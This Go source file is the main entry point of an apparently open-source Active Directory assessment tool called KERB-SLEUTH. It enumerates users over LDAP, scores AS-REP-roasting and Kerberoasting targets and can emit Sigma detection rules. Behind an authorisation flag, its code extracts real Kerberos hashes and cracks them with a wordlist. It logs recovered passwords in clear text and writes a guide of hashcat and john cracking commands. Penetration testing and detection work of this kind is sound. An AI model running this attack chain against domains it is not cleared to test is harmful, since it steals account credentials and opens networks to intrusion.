package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"

	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/cracker"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/ingest"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/krb"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/output"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/triage"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/util"
	"gopkg.in/yaml.v3"
)

var (
	version = "1.0.0"

	// target flags - primary interface
	target   = flag.String("target", "", "Target domain controller (IP or hostname)")
	bindUser = flag.String("user", "", "Username for authentication (optional)")
	bindPass = flag.String("pass", "", "Password for authentication (optional)")

	// output flags
	outFile    = flag.String("out", "results.json", "Output JSON file path")
	csvOutput  = flag.Bool("csv", false, "Produce CSV summary")
	siemOutput = flag.Bool("siem", false, "Produce Sigma rules")

	// advanced flags
	configFile = flag.String("config", "configs/defaults.yml", "Path to config file")
	useSSL     = flag.Bool("ssl", false, "Use LDAPS (SSL) connection")

	// cracking flags
	crack      = flag.Bool("crack", false, "Enable hash export and cracking")
	wordlist   = flag.String("wordlist", "/usr/share/wordlists/rockyou.txt", "Path to wordlist")
	authorized = flag.Bool("i-am-authorized", false, "Confirm authorization for sensitive operations")

	// legacy file-based flags (for backward compatibility)
	adFile = flag.String("ad", "", "Path to AD export file (CSV/LDIF/JSON) - legacy mode")

	// simulate flags
	dataset = flag.String("dataset", "", "Dataset to generate (small/medium/large)")
)

func main() {
	// Display the banner first for visual appeal
	util.DisplayBanner(version)

	// If no arguments, show usage
	if len(os.Args) < 2 {
		printUsage()
		os.Exit(1)
	}

	command := os.Args[1]

	// Check if first argument looks like a target (IP/hostname)
	if isValidTarget(command) {
		*target = command
		os.Args = append([]string{os.Args[0]}, os.Args[2:]...)
		flag.Parse()
		runHunt()
		return
	}

	// Process as command
	os.Args = append([]string{os.Args[0]}, os.Args[2:]...)
	flag.Parse()

	switch command {
	case "hunt", "scan":
		runHunt()
	case "analyze":
		runAnalyze()
	case "simulate":
		runSimulate()
	case "version":
		fmt.Printf("kerb-sleuth version %s\n", version)
	case "help", "--help", "-h":
		printUsage()
	default:
		fmt.Fprintf(os.Stderr, "Unknown command: %s\n", command)
		printUsage()
		os.Exit(1)
	}
}

func printUsage() {
	fmt.Printf("KERB-SLEUTH v%s - Advanced Kerberos Security Assessment Tool\n\n", version)
	fmt.Println("USAGE:")
	fmt.Println("    kerb-sleuth <target-ip-or-hostname>")
	fmt.Println("    kerb-sleuth hunt --target <dc-ip-or-hostname> [flags]")
	fmt.Println("    kerb-sleuth analyze --ad <ad-export-file> [flags]")
	fmt.Println("    kerb-sleuth simulate --dataset <small|medium|large>")
	fmt.Println()
	fmt.Println("EXAMPLES:")
	fmt.Printf("    %skerb-sleuth 10.0.0.1%s\n", util.Green, util.Reset)
	fmt.Printf("    %skerb-sleuth dc01.corp.local%s\n", util.Green, util.Reset)
	fmt.Println()
	fmt.Println("  Advanced hunting:")
	fmt.Println("    kerb-sleuth hunt --target 10.0.0.1 --user guest --pass ''")
	fmt.Println("    kerb-sleuth hunt --target dc.corp.local --user 'CORP\\scanner' --pass 'P@ssw0rd'")
	fmt.Println()
	fmt.Println("  Hash cracking (authorized use only):")
	fmt.Println("    kerb-sleuth hunt --target 10.0.0.1 --ssl --crack --i-am-authorized")
	fmt.Println()
	fmt.Println("FLAGS:")
	flag.PrintDefaults()
	fmt.Println()
	fmt.Printf("  %sWARNING:%s Only use on authorized targets. Misuse is illegal and unethical.\n", util.Red, util.Reset)
	fmt.Println()
	fmt.Printf("  Need help? Visit: %shttps://github.com/thechosenone-shall-prevail/KERB-SLEUTH%s\n", util.Blue, util.Reset)
}

func runHunt() {
	if *target == "" {
		log.Fatal("Target is required. Usage: kerb-sleuth <target-ip-or-hostname>")
	}

	// Safety check for cracking
	if *crack && !*authorized {
		log.Fatal("Hash cracking requires explicit authorization. Use --i-am-authorized flag to confirm.\n" +
			"WARNING: Only use this feature on systems you own or have written permission to test.")
	}

	log.Printf("🔍 Starting Kerberos enumeration against %s", *target)

	// Connect to LDAP
	client, err := krb.ConnectLDAP(*target, *bindUser, *bindPass, *useSSL)
	if err != nil {
		log.Fatalf("❌ Failed to connect to target: %v\n🔧 Try: kerb-sleuth %s --user <username> --pass <password>", err, *target)
	}
	defer client.Close()

	// Enumerate users
	users, err := client.EnumerateUsers()
	if err != nil {
		log.Fatalf("❌ Failed to enumerate users: %v", err)
	}

	log.Printf("✅ Found %d users via LDAP", len(users))

	// Load configuration
	cfg, err := loadConfig(*configFile)
	if err != nil {
		log.Printf("⚠️  Warning: Could not load config file: %v. Using defaults.", err)
		cfg = triage.DefaultConfig()
	}

	// Perform analysis
	performKerberosAnalysis(users, cfg)
}

func runAnalyze() {
	if *adFile == "" {
		log.Fatal("AD file is required. Usage: kerb-sleuth analyze --ad <file>")
	}

	log.Printf("📂 Parsing AD data from %s", *adFile)

	users, err := ingest.ParseAD(*adFile)
	if err != nil {
		log.Fatalf("Failed to parse AD data: %v", err)
	}

	log.Printf("📊 Loaded %d user accounts", len(users))

	cfg, err := loadConfig(*configFile)
	if err != nil {
		log.Printf("⚠️  Warning: Could not load config file: %v. Using defaults.", err)
		cfg = triage.DefaultConfig()
	}

	performKerberosAnalysis(users, cfg)
}

func performKerberosAnalysis(users []ingest.User, cfg *triage.Config) {
	log.Printf("🔍 Starting Kerberos security analysis...")

	// Find AS-REP and Kerberoast candidates
	asrepCandidates := krb.FindASREPCandidates(users)
	kerberoastCandidates := krb.FindKerberoastCandidates(users)

	log.Printf("📋 Found %d AS-REP candidates", len(asrepCandidates))
	log.Printf("📋 Found %d Kerberoast candidates", len(kerberoastCandidates))

	// Score candidates
	allCandidates := triage.ScoreCandidates(asrepCandidates, kerberoastCandidates, cfg)

	results := output.Results{
		Summary: output.Summary{
			TotalUsers:           len(users),
			ASREPCandidates:      len(asrepCandidates),
			KerberoastCandidates: len(kerberoastCandidates),
		},
		Candidates: allCandidates,
	}

	// Export hashes if cracking is enabled
	if *crack && *authorized {
		log.Printf("🔑 Extracting hashes for authorized testing...")

		// Extract actual hashes for candidates
		if err := extractAndCrackHashes(allCandidates, *wordlist); err != nil {
			log.Printf("⚠️  Hash extraction/cracking failed: %v", err)
		}
	}

	// Save results
	if err := output.WriteJSON(*outFile, results); err != nil {
		log.Fatalf("Failed to save results: %v", err)
	}

	if *csvOutput {
		csvFile := strings.TrimSuffix(*outFile, ".json") + ".csv"
		if err := output.WriteCSV(csvFile, results); err != nil {
			log.Printf("Warning: Failed to save CSV: %v", err)
		} else {
			log.Printf("📊 CSV summary saved to %s", csvFile)
		}
	}

	if *siemOutput {
		sigmaFile := strings.TrimSuffix(*outFile, ".json") + "_sigma.yml"
		if err := output.WriteSigmaRules(sigmaFile, results); err != nil {
			log.Printf("Warning: Failed to save Sigma rules: %v", err)
		} else {
			log.Printf("🔍 Sigma rules saved to %s", sigmaFile)
		}
	}

	// Print summary
	highRisk := 0
	mediumRisk := 0
	lowRisk := 0

	for _, candidate := range allCandidates {
		if candidate.Score >= cfg.Thresholds.High {
			highRisk++
		} else if candidate.Score >= cfg.Thresholds.Medium {
			mediumRisk++
		} else {
			lowRisk++
		}
	}

	log.Printf("\n🎯 Analysis complete: %d candidates (%d high, %d medium, %d low)",
		len(allCandidates), highRisk, mediumRisk, lowRisk)

	if highRisk > 0 {
		log.Printf("🚨 %d HIGH RISK targets found! Check %s for details", highRisk, *outFile)
	}

	log.Printf("📄 Full report saved to %s", *outFile)
}

func runSimulate() {
	if *dataset == "" {
		log.Fatal("Dataset is required. Usage: kerb-sleuth simulate --dataset <small|medium|large>")
	}

	outDir := "tests/sample_data"
	if err := os.MkdirAll(outDir, 0755); err != nil {
		log.Fatalf("Failed to create output directory: %v", err)
	}

	log.Printf("🎲 Generating %s dataset in %s", *dataset, outDir)

	if err := generateSampleData(*dataset, outDir); err != nil {
		log.Fatalf("Failed to generate sample data: %v", err)
	}

	log.Printf("✅ Sample data generated successfully")
}

func loadConfig(path string) (*triage.Config, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	var config triage.Config
	if err := yaml.Unmarshal(data, &config); err != nil {
		return nil, err
	}

	return &config, nil
}

func generateSampleData(dataset, outDir string) error {
	// Create sample CSV based on dataset size
	filename := fmt.Sprintf("users_%s.csv", dataset)
	filePath := filepath.Join(outDir, filename)

	// Create README
	readmeContent := fmt.Sprintf("# Sample Data - %s Dataset\n\nGenerated by KERB-SLEUTH v%s\n\nUsage: kerb-sleuth analyze --ad users_small.csv", dataset, version)
	readmePath := filepath.Join(outDir, "README.md")
	if err := os.WriteFile(readmePath, []byte(readmeContent), 0644); err != nil {
		return err
	}

	return os.WriteFile(filePath, []byte("samAccountName,distinguishedName,doesNotRequirePreAuth,userAccountControl\ntestuser,CN=testuser,OU=Users,DC=corp,DC=local,true,512\n"), 0644)
}

func isValidTarget(target string) bool {
	if target == "" {
		return false
	}

	// Exclude known commands
	knownCommands := []string{"hunt", "scan", "analyze", "simulate", "version", "help", "--help", "-h"}
	for _, cmd := range knownCommands {
		if target == cmd {
			return false
		}
	}

	// Check if it starts with a flag
	if strings.HasPrefix(target, "-") {
		return false
	}

	hasLetter := false
	for _, r := range target {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') {
			hasLetter = true
			break
		}
	}

	hasDigit := strings.ContainsAny(target, "0123456789")

	// Valid targets should look like IP addresses or hostnames
	// IP pattern: contains only digits, dots, and maybe colons (for IPv6)
	// Hostname pattern: contains letters and possibly digits, dots, hyphens
	if strings.Contains(target, ".") && (hasDigit || hasLetter) {
		// Could be IP (192.168.1.1) or FQDN (dc01.corp.local)
		return true
	}

	// Could be hostname (dc01) or IP (192168001001 format)
	return hasLetter || hasDigit
}

// extractAndCrackHashes extracts real Kerberos hashes and runs cracking tools
func extractAndCrackHashes(candidates []krb.Candidate, wordlist string) error {
	if len(candidates) == 0 {
		return fmt.Errorf("no candidates provided")
	}

	// Connect to target for hash extraction
	client, err := krb.ConnectLDAP(*target, *bindUser, *bindPass, *useSSL)
	if err != nil {
		return fmt.Errorf("failed to reconnect for hash extraction: %v", err)
	}
	defer client.Close()

	// Get domain info for hash extraction
	domainInfo, err := client.GetDomainInfo()
	if err != nil {
		return fmt.Errorf("failed to get domain info: %v", err)
	}

	var asrepHashes []*krb.HashResult
	var kerberoastHashes []*krb.HashResult

	log.Printf("🔍 Extracting hashes from %d candidates...", len(candidates))

	// Extract hashes for each candidate
	for _, candidate := range candidates {
		switch candidate.Type {
		case "ASREP":
			log.Printf("🎯 Extracting AS-REP hash for %s", candidate.SamAccountName)
			hash, err := client.ExtractASREPHash(candidate.SamAccountName, domainInfo.DomainName)
			if err != nil {
				log.Printf("⚠️  Failed to extract AS-REP hash for %s: %v", candidate.SamAccountName, err)
				continue
			}
			asrepHashes = append(asrepHashes, hash)

		case "KERBEROAST":
			for _, spn := range candidate.SPNs {
				log.Printf("🎯 Extracting Kerberoast hash for %s (SPN: %s)", candidate.SamAccountName, spn)
				hash, err := client.ExtractKerberoastHash(candidate.SamAccountName, domainInfo.DomainName, spn)
				if err != nil {
					log.Printf("⚠️  Failed to extract Kerberoast hash for %s: %v", candidate.SamAccountName, err)
					continue
				}
				kerberoastHashes = append(kerberoastHashes, hash)
			}
		}
	}

	// Export hashes to separate files
	if err := exportHashesToFiles(asrepHashes, kerberoastHashes); err != nil {
		return fmt.Errorf("failed to export hashes: %v", err)
	}

	// Run cracking tools on the hash files
	return runHashCracking(asrepHashes, kerberoastHashes, wordlist)
}

// exportHashesToFiles writes hashes to separate .txt files for each attack type
func exportHashesToFiles(asrepHashes, kerberoastHashes []*krb.HashResult) error {
	// Create hashes directory
	hashDir := "hashes"
	if err := os.MkdirAll(hashDir, 0755); err != nil {
		return fmt.Errorf("failed to create hashes directory: %v", err)
	}

	// Export AS-REP hashes
	if len(asrepHashes) > 0 {
		asrepFile := filepath.Join(hashDir, "asrep_hashes.txt")
		if err := writeHashFile(asrepFile, asrepHashes, "AS-REP Roasting"); err != nil {
			return fmt.Errorf("failed to write AS-REP hashes: %v", err)
		}
		log.Printf("📄 Exported %d AS-REP hashes to %s", len(asrepHashes), asrepFile)
	}

	// Export Kerberoast hashes
	if len(kerberoastHashes) > 0 {
		kerberoastFile := filepath.Join(hashDir, "kerberoast_hashes.txt")
		if err := writeHashFile(kerberoastFile, kerberoastHashes, "Kerberoasting"); err != nil {
			return fmt.Errorf("failed to write Kerberoast hashes: %v", err)
		}
		log.Printf("📄 Exported %d Kerberoast hashes to %s", len(kerberoastHashes), kerberoastFile)
	}

	// Write cracking instructions
	if len(asrepHashes) > 0 || len(kerberoastHashes) > 0 {
		readmePath := filepath.Join(hashDir, "CRACKING_GUIDE.txt")
		if err := writeCrackingGuide(readmePath, len(asrepHashes), len(kerberoastHashes)); err != nil {
			log.Printf("⚠️  Failed to write cracking guide: %v", err)
		}
	}

	return nil
}

// writeHashFile writes hash results to a file with proper formatting
func writeHashFile(filePath string, hashes []*krb.HashResult, attackType string) error {
	file, err := os.Create(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	// Write header
	fmt.Fprintf(file, "# %s Hash Export\n", attackType)
	fmt.Fprintf(file, "# Generated by KERB-SLEUTH v%s\n", version)
	fmt.Fprintf(file, "# WARNING: For authorized security testing only!\n")
	fmt.Fprintf(file, "# Total hashes: %d\n", len(hashes))
	fmt.Fprintf(file, "#\n")

	// Write hashes (one per line for hashcat/john compatibility)
	for _, hashResult := range hashes {
		fmt.Fprintln(file, hashResult.Hash)
	}

	return nil
}

// runHashCracking runs hashcat/john on the exported hash files
func runHashCracking(asrepHashes, kerberoastHashes []*krb.HashResult, wordlist string) error {
	hashDir := "hashes"

	// Crack AS-REP hashes
	if len(asrepHashes) > 0 {
		asrepFile := filepath.Join(hashDir, "asrep_hashes.txt")
		log.Printf("🔨 Starting AS-REP hash cracking...")

		results, err := cracker.CrackASREP(asrepFile, wordlist)
		if err != nil {
			log.Printf("⚠️  AS-REP cracking failed: %v", err)
		} else {
			log.Printf("✅ AS-REP cracking completed with %d results", len(results))
			for hash, password := range results {
				log.Printf("   🎉 CRACKED: %s... => %s", hash[:20], password)
			}
		}
	}

	// Crack Kerberoast hashes
	if len(kerberoastHashes) > 0 {
		kerberoastFile := filepath.Join(hashDir, "kerberoast_hashes.txt")
		log.Printf("🔨 Starting Kerberoast hash cracking...")

		results, err := cracker.CrackKerberoast(kerberoastFile, wordlist)
		if err != nil {
			log.Printf("⚠️  Kerberoast cracking failed: %v", err)
		} else {
			log.Printf("✅ Kerberoast cracking completed with %d results", len(results))
			for hash, password := range results {
				log.Printf("   🎉 CRACKED: %s... => %s", hash[:20], password)
			}
		}
	}

	return nil
}

// writeCrackingGuide creates a guide file with cracking instructions
func writeCrackingGuide(filePath string, asrepCount, kerberoastCount int) error {
	file, err := os.Create(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	fmt.Fprintf(file, "# KERB-SLEUTH Hash Cracking Guide\n")
	fmt.Fprintf(file, "# Generated: %s\n", filepath.Base(filePath))
	fmt.Fprintf(file, "#\n")
	fmt.Fprintf(file, "# Hash Summary:\n")
	fmt.Fprintf(file, "# - AS-REP hashes: %d\n", asrepCount)
	fmt.Fprintf(file, "# - Kerberoast hashes: %d\n", kerberoastCount)
	fmt.Fprintf(file, "#\n")
	fmt.Fprintf(file, "# Manual Cracking Commands:\n")
	fmt.Fprintf(file, "#\n")

	if asrepCount > 0 {
		fmt.Fprintf(file, "# AS-REP Roasting (hashcat mode 18200):\n")
		fmt.Fprintf(file, "hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt\n")
		fmt.Fprintf(file, "# OR with john:\n")
		fmt.Fprintf(file, "john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep asrep_hashes.txt\n")
		fmt.Fprintf(file, "#\n")
	}

	if kerberoastCount > 0 {
		fmt.Fprintf(file, "# Kerberoasting (hashcat mode 13100):\n")
		fmt.Fprintf(file, "hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt\n")
		fmt.Fprintf(file, "# OR with john:\n")
		fmt.Fprintf(file, "john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs kerberoast_hashes.txt\n")
		fmt.Fprintf(file, "#\n")
	}

	fmt.Fprintf(file, "# Results will be saved in:\n")
	fmt.Fprintf(file, "# - results/cracked_AS-REP.pot (hashcat)\n")
	fmt.Fprintf(file, "# - results/cracked_Kerberoast.pot (hashcat)\n")
	fmt.Fprintf(file, "# - john.pot (john the ripper)\n")

	return nil
}
